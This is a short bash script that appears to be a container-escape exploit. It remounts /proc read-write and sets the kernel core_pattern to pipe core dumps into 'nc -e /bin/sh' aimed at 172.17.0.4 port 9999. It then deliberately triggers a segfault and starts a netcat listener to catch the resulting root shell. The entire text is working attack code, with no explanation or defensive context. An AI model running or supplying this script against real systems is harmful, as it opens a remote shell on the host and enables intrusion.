#!/bin/bash
mount -o remount rw /proc/
if [ "$?" == "1" ]; then
    echo "Couldn't remount /proc/ as rw";
    exit 1;
fi

echo "Remounted /proc/ as rw";
echo "|/bin/nc -e /bin/sh 172.17.0.4 9999" > /proc/sys/kernel/core_pattern

if [ "$?" == "1" ]; then
    echo "Couldn't set up nc payload";
    exit 2;
fi

echo "Set up nc payload";
echo "Segfault in 5 seconds..."
sleep 5 && ./segfault 2>/dev/null &
echo "Starting nc listener"
nc -vl 9999
